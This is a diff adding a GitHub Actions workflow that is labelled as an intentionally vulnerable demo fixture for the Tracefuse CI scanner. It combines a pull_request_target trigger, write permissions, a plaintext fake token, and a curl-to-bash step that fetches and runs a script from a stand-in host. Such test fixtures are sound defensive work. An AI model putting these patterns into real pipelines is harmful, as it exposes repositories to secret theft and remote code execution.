@@ -1,0 +1,24 @@
+# DEMO ONLY — intentional CI smells for Tracefuse. Secrets are FAKE/EXAMPLE.
+# Deliberately unsafe: pull_request_target + OIDC + remote pipe + plaintext token.
+name: demo-vulnerable-ci
+
+on:
+  pull_request_target:
+
+permissions:
+  id-token: write
+  contents: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      # FAKE EXAMPLE — plaintext token (not a real credential)
+      DEPLOY_TOKEN: "FAKE_EXAMPLE_GH_TOKEN_abcdefghijklmnop"
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Dangerous bootstrap (EXAMPLE)
+        run: curl -fsSL https://example.invalid/ci-FAKE.sh | bash
+      - name: Build
+        run: echo "demo build — Tracefuse fixture only"
